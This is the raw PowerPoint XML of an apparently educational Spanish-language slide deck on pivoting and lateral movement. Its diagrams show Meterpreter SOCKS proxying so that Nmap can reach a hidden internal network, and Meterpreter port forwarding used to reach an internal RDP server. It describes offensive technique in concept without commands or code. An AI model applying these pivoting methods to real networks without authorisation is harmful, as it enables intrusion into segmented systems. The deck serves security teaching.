            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0"/>
              <a:t>RED INTERNA OCULTA (10.10.10.0/24)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MX" sz="2000" dirty="0"/>
              <a:t>Host 2 (Base de Datos o Servidor de Archivos)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MX" sz="2000" dirty="0"/>
              <a:t>IP: 10.10.10.15</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1"/>
            <a:endParaRPr lang="es-MX" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0"/>
              <a:t>--&gt; FLUJO DE TRÁFICO: - El Atacante configura </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0" err="1"/>
              <a:t>Nmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0"/>
              <a:t> para usar el Proxy SOCKS (1080). - El tráfico de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0" err="1"/>
              <a:t>Nmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0"/>
              <a:t> viaja por el túnel de la Sesión de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0" err="1"/>
              <a:t>Meterpreter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0"/>
              <a:t> - El tráfico emerge en el Host 1 con IP 10.10.10.5. - El Host 1 envía el paquete de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0" err="1"/>
              <a:t>Nmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0"/>
              <a:t> al Host 2 (10.10.10.15).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0"/>
              <a:t>--&gt; CONCEPTO: El Atacante tiene acceso total a toda la red interna como si estuviera sentado en el Host 1.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B14B556-730D-E37A-C431-45BA6796D7CF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4150196" y="232440"/>
            <a:ext cx="61091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 err="1"/>
              <a:t>Pivot</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" dirty="0"/>
              <a:t> - Túnel SOCKS</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4242244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2159393-29DB-E012-6DFE-25C030C90E64}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3358108" y="116632"/>
            <a:ext cx="61091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Port </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" dirty="0" err="1"/>
              <a:t>Forwarding</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" dirty="0"/>
              <a:t> - Túnel Directo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6805BA0-DD84-C6AE-2F63-E469180308C6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1125860" y="980728"/>
            <a:ext cx="10945216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sz="2000" dirty="0"/>
              <a:t>[Host Atacante] &lt;-----&gt; [Internet / </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0" err="1"/>
              <a:t>Router</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0"/>
              <a:t> Externo] &lt;-----&gt; [Host 1 Comprometido (El Pivote)]</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0"/>
              <a:t>HOST ATACANTE (Kali)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MX" sz="2000" dirty="0"/>
              <a:t>IP: 192.168.1.10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MX" sz="2000" dirty="0"/>
              <a:t>Cliente RDP se conecta a: 127.0.0.1:3333</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0"/>
              <a:t>HOST 1 COMPROMETIDO (El Pivote)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MX" sz="2000" dirty="0"/>
              <a:t>IP Interna: 10.10.10.5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MX" sz="2000" dirty="0"/>
              <a:t>FUNCIÓN: Tiene una regla de "Port </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0" err="1"/>
              <a:t>Forwarding</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0"/>
              <a:t>" activa en </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0" err="1"/>
              <a:t>Meterpreter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2000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MX" sz="2000" dirty="0"/>
              <a:t>Regla: Tráfico entrante al puerto 3333 (local) se reenvía al 10.10.10.15:3389 (remoto).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0"/>
              <a:t>HOST 2 INTERNO (Servidor de Escritorio Remoto)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MX" sz="2000" dirty="0"/>
              <a:t>IP Interna: 10.10.10.15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MX" sz="2000" dirty="0"/>
              <a:t>Servicio Abierto: Puerto 3389 (RDP)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1"/>
            <a:endParaRPr lang="es-MX" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0"/>
              <a:t>--&gt; FLUJO DE TRÁFICO: - El Atacante se conecta a su puerto local 3333. - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0" err="1"/>
              <a:t>Meterpreter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0"/>
              <a:t> intercepta el tráfico y lo inyecta directamente al puerto 3389 del Host 2 (10.10.10.15). - El Host 2 cree que la conexión RDP viene del Host 1.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0"/>
              <a:t>--&gt; CONCEPTO: El atacante puede usar un cliente RDP (o SSH, o Base de Datos) normal para acceder a un servicio oculto, sin necesidad de usar herramientas con </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="2000" dirty="0" err="1"/>
              <a:t>proxychains</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX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36196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nología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9533260_TF02787990_TF02787990.potx" id="{711CCDD4-BD90-4388-A31E-EA977055FCFF}" vid="{C5F9FE6A-8390-4E5A-B0DB-91EA047CC61C}"/>
    </a:ext>
  </a:extLst>
</a:theme>
</file>

<file path=ppt/theme/theme2.xml><?xml version="1.0" encoding="utf-8"?>
<a:theme xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" name="Tema de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Presentación de líneas de triple circuito (panorámica)</Template>
  <TotalTime>40</TotalTime>
  <Words>2159</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>Personalizado</PresentationFormat>
  <Paragraphs>170</Paragraphs>
  <Slides>15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Arial</vt:lpstr>
      <vt:lpstr>Calibri</vt:lpstr>
      <vt:lpstr>Courier New</vt:lpstr>
      <vt:lpstr>Google Sans Text</vt:lpstr>
      <vt:lpstr>Tecnología 16x9</vt:lpstr>
      <vt:lpstr>Pivotaje y Movimiento Lateral</vt:lpstr>
      <vt:lpstr>El Problema de la Red Segmentada</vt:lpstr>
      <vt:lpstr>pivot</vt:lpstr>
      <vt:lpstr>Port forwarding</vt:lpstr>
      <vt:lpstr>Presentación de PowerPoint</vt:lpstr>
      <vt:lpstr>Pivotaje con Metasploit: La Ruta del SOCKS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Patricio Ignacio Carrasco Zura</dc:creator>
  <cp:lastModifiedBy>Patricio Ignacio Carrasco Zura</cp:lastModifiedBy>
  <cp:revision>1</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2025-11-10T01:57:53Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2025-11-10T02:38:06Z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